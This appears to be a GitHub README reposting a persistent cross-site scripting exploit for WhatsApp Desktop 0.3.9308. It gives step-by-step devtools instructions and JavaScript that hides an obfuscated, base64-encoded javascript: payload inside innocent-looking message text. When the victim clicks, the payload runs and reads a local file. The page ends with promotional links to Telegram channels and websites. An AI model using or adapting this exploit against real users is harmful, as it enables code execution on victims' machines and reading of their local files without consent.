# ![Pic](https://raw.githubusercontent.com/attakercyebr/Whatsapp-Desktop-session-hijacking-/main/1.jpg) 


## Description:
----------------------
- // Title: WhatsApp Desktop 0.3.9308 - Persistent Cross-Site Scripting

- // Date: 2020-01-21

- // Vendor Homepage: https://www.whatsapp.com

- // Software Link: https://web.whatsapp.com/desktop/windows/release/x64/WhatsAppSetup.exe

- // Software Link: https://web.whatsapp.com/desktop/mac/files/WhatsApp.dmg

- // Version: 0.3.9308

- // Exploit Author: Gal Weizman

- // Tested On: Mac OS, Windows, iPhone

## Get a license
----------------------
- 🎁 Totally free for all channel members.


## how to work :
----------------------
- // step 1: open WhatsApp Web and enter a conversation (Will only work on WhatsApp Web source code as compiled with version 0.3.9308)

- // step 2: open devtools and search in all files "t=e.id"

- // step 3: after prettifying, set a breakpoint at the line where "t = e.id" can be found

- // step 4: paste "https://example.com" in the text box and hit "Enter"

- // step 5: when the code stops at the breakpoint, paste the following exploit code in the console and hit "Enter"

- // step 6: press F8 in order for the execution to continue

- // result: a message should be sent to the victim that once is clicked will execute the payload above

## Code
----------------------

```javascript
var payload = `(async function() {
alert(navigator.userAgent);
(async function() {
// read "file:///C:/windows/system32/drivers/etc/hosts" content
const r = await fetch(atob('ZmlsZTovLy9DOi93aW5kb3dzL3N5c3RlbTMyL2RyaXZlcnMvZXRjL2hvc3Rz'));
const t = await r.text();
alert(t);
}())
}())`;

payload = `javascript:"https://example.com";eval(atob("${btoa(payload)}"))`;

e.__x_matchedText = payload;

e.__x_body = `
Innocent text

${payload}

More Innocent text
`;

```

## video:
----------------------
- # ![video](https://drive.google.com/file/d/1b9Nk47asoylREdLHGsqO3WlmHxrlkCvg/view) 


## Visit the following channels and sites for more training and tools:
----------------------
- 🔞 https://m4nifest0.com
- 🔞 https://m4nifest0.group
- 🔞 https://m4nifest0.shop
- 🔞 https://t.me/M4nifest0

----------------------

<h2>
<p align="center">	
</a>&nbsp;&nbsp;&nbsp;&nbsp;
	<a href="https://t.me/M4nifest0">
		<img src="https://img.shields.io/badge/Telegram-%23000000.svg?&style=for-the-badge&logo=Telegram&logoColor=white" />
	</a>&nbsp;&nbsp;&nbsp;&nbsp;
	<a href="https://twitter.com/_M4nifest0_">
		<img src="https://img.shields.io/badge/twitter-%231DA1F2.svg?&style=for-the-badge&logo=twitter&logoColor=white" />
	</a>&nbsp;&nbsp;&nbsp;&nbsp;
	<a href="https://m4nifest0.com">
		<img src="https://img.shields.io/badge/WebSite-%234A154B.svg?&style=for-the-badge&logo=slack&logoColor=white" />
	</a>&nbsp;&nbsp;&nbsp;&nbsp;
</p>
